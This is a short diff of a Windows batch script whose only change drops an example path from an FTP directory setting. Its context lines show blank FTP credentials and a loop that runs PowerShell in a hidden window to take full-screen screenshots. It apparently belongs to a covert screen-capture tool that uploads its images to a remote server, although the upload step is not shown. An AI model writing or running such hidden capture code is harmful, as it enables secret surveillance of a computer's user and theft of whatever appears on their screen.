@@ -11,7 +11,7 @@ set "numScreenshots=3"
 set "ftpServer="
 set "ftpUser="
 set "ftpPass="
-set "ftpDir=" :: eg /htdocs/Upload
+set "ftpDir=" 
 
 for /L %%i in (1,1,%numScreenshots%) do (
     powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bitmap = New-Object System.Drawing.Bitmap ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap.Size); $bitmap.Save('%batchDir%screenshot_%%i.png'); $graphics.Dispose(); $bitmap.Dispose();"
